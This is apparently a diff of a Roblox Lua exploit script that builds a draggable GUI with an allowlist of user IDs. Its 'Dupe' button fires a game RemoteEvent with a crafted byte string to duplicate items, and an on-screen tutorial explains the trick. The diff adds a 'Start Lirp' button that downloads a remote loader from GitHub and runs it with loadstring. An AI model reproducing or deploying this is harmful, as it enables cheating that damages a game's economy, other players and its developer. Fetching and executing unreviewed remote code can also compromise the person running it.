@@ -1,42 +1,79 @@
 local player = game.Players.LocalPlayer
 local userId = player.UserId
 
--- ✅ Список разрешённых UserId (замени на свои реальные ID)
+-- ✅ Авторизованные ID
 local allowedIds = {
-    8951663194, -- твой основной аккаунт
-    8082204039,     -- устройство 2
-    123458,     -- устройство 3
-    123459,     -- устройство 4
-    123460      -- устройство 5
+	8951663194, 8082204039, 123458, 123459, 123460,
+	123461, 123462, 123463, 123464, 123465,
+	123466, 123467, 123468, 123469, 123470,
+	123471, 123472, 123473, 123474, 123475
 }
 
--- 🔍 Проверка доступа
+-- 🔐 Проверка доступа
 local isAllowed = false
 for _, id in ipairs(allowedIds) do
-    if userId == id then
-        isAllowed = true
-        break
-    end
+	if userId == id then
+		isAllowed = true
+		break
+	end
 end
 
 if not isAllowed then
-    warn("❌ Access denied for UserId:", userId)
-    return
-else
-    warn("✅ Access granted for UserId:", userId)
+	warn("❌ Access denied for UserId:", userId)
+	return
 end
 
--- 🧩 Создание GUI
+-- GUI
 local gui = Instance.new("ScreenGui", player:WaitForChild("PlayerGui"))
-gui.Name = "DupeHub"
+gui.Name = "PahTeTLauncher"
 gui.ResetOnSpawn = false
 
+-- 🔧 Основное окно
 local frame = Instance.new("Frame", gui)
-frame.Size = UDim2.new(0, 400, 0, 300)
-frame.Position = UDim2.new(0.5, -200, 0.5, -150)
+frame.Size = UDim2.new(0, 400, 0, 320)
+frame.Position = UDim2.new(0.5, -200, 0.5, -160)
 frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 frame.BorderSizePixel = 0
 
+-- ✨ Обводка
+local stroke = Instance.new("UIStroke", frame)
+stroke.Thickness = 2
+stroke.Color = Color3.new(1, 1, 1)
+stroke.Transparency = 0.5
+stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+-- 🖱 Перетаскивание
+local dragging, dragInput, dragStart, startPos
+frame.Active = true
+frame.Draggable = false
+
+frame.InputBegan:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseButton1 then
+		dragging = true
+		dragStart = input.Position
+		startPos = frame.Position
+		input.Changed:Connect(function()
+			if input.UserInputState == Enum.UserInputState.End then
+				dragging = false
+			end
+		end)
+	end
+end)
+
+frame.InputChanged:Connect(function(input)
+	if input.UserInputType == Enum.UserInputType.MouseMovement then
+		dragInput = input
+	end
+end)
+
+game:GetService("UserInputService").InputChanged:Connect(function(input)
+	if input == dragInput and dragging then
+		local delta = input.Position - dragStart
+		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+	end
+end)
+
+-- 🏷 Заголовок
 local title = Instance.new("TextLabel", frame)
 title.Size = UDim2.new(1, -40, 0, 40)
 title.Position = UDim2.new(0, 20, 0, 10)
@@ -47,6 +84,7 @@ title.Font = Enum.Font.SourceSansBold
 title.TextSize = 24
 title.TextXAlignment = Enum.TextXAlignment.Left
 
+-- ❌ Закрыть
 local closeBtn = Instance.new("TextButton", frame)
 closeBtn.Size = UDim2.new(0, 30, 0, 30)
 closeBtn.Position = UDim2.new(1, -35, 0, 5)
@@ -56,9 +94,10 @@ closeBtn.TextColor3 = Color3.new(1, 1, 1)
 closeBtn.Font = Enum.Font.SourceSansBold
 closeBtn.TextSize = 18
 closeBtn.MouseButton1Click:Connect(function()
-    gui:Destroy()
+	gui:Destroy()
 end)
 
+-- 🔁 Dupe
 local dupeBtn = Instance.new("TextButton", frame)
 dupeBtn.Size = UDim2.new(0.8, 0, 0, 40)
 dupeBtn.Position = UDim2.new(0.1, 0, 0.25, 0)
@@ -68,15 +107,16 @@ dupeBtn.TextColor3 = Color3.new(1, 1, 1)
 dupeBtn.Font = Enum.Font.SourceSansBold
 dupeBtn.TextSize = 20
 dupeBtn.MouseButton1Click:Connect(function()
-    local rs = game:GetService("ReplicatedStorage")
-    if rs:FindFirstChild("Remotes") and rs.Remotes:FindFirstChild("Trap") then
-        rs.Remotes.Trap:FireServer(nil, "\195\191")
-        warn("Dupe triggered")
-    else
-        warn("Remote not found")
-    end
+	local rs = game:GetService("ReplicatedStorage")
+	if rs:FindFirstChild("Remotes") and rs.Remotes:FindFirstChild("Trap") then
+		rs.Remotes.Trap:FireServer(nil, "\195\191")
+		warn("Dupe triggered")
+	else
+		warn("Remote not found")
+	end
 end)
 
+-- 🔄 Rejoin
 local rejoinBtn = Instance.new("TextButton", frame)
 rejoinBtn.Size = UDim2.new(0.8, 0, 0, 40)
 rejoinBtn.Position = UDim2.new(0.1, 0, 0.45, 0)
@@ -86,13 +126,28 @@ rejoinBtn.TextColor3 = Color3.new(1, 1, 1)
 rejoinBtn.Font = Enum.Font.SourceSansBold
 rejoinBtn.TextSize = 20
 rejoinBtn.MouseButton1Click:Connect(function()
-    game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
+	game:GetService("TeleportService"):TeleportToPlaceInstance(game.PlaceId, game.JobId, player)
 end)
 
+-- 🚀 Start Lirp
+local lirpBtn = Instance.new("TextButton", frame)
+lirpBtn.Size = UDim2.new(0.8, 0, 0, 40)
+lirpBtn.Position = UDim2.new(0.1, 0, 0.65, 0)
+lirpBtn.Text = "Start Lirp"
+lirpBtn.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+lirpBtn.TextColor3 = Color3.new(1, 1, 1)
+lirpBtn.Font = Enum.Font.SourceSansBold
+lirpBtn.TextSize = 20
+lirpBtn.MouseButton1Click:Connect(function()
+	getgenv().Key = "EnableModDetectorAgain@!%!5#*@y*UhUEasgfh*di2%#u%@#i#*%@o%12O5HEA*SLGFSTIUDGao@!%@!*(^#T(@UW*UGJIOHSEDH@(#@"
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/LirpOfficial/Lirp/refs/heads/main/Loader", true))()
+end)
+
+-- 📘 Туториал
 local tutorial = Instance.new("TextLabel", frame)
 tutorial.Size = UDim2.new(0.9, 0, 0, 80)
-tutorial.Position = UDim2.new(0.05, 0, 0.7, 0)
-tutorial.Text = "📌 Tutorial:\n1. Put the loot you want to dupe into your backpack\n2. Rejoin the game with your backpack and loot inside\n3. Press the Dupe button, drop your backpack, then press Rejoin"
+tutorial.Position = UDim2.new(0.05, 0, 0.8, 0)
+tutorial.Text = "📌 Tutorial:\n1. Put loot in backpack\n2. Rejoin\n3. Press Dupe, drop backpack, then Rejoin"
 tutorial.TextColor3 = Color3.new(1, 1, 1)
 tutorial.BackgroundTransparency = 1
 tutorial.Font = Enum.Font.SourceSans
